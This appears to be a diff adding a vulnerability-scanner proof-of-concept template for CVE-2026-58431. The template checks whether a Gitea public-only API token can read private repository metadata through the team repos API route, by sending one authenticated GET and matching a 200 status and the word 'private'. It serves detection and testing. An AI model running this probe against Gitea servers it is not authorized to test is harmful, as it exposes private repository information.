@@ -1,0 +1,38 @@
+[info]
+author = "ave"
+description = "验证 Gitea public-only API 令牌是否可绕过团队 API 路由访问私有仓库元数据"
+id = "POC-AVE-2026-0668"
+name = "CVE-2026-58431 PoC"
+severity = "medium"
+tags = ["ave-2026-0668"]
+vuln_id = [
+    "CVE-2026-58431",
+    "AVE-2026-0668",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/api/v1/teams/{{TeamID}}/repos"
+protocol = "http"
+
+[[poc.requests.extractors]]
+name = "repo_names"
+part = "body"
+type = "json"
+
+[poc.requests.headers]
+Authorization = "token {{PublicOnlyToken}}"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["private"]
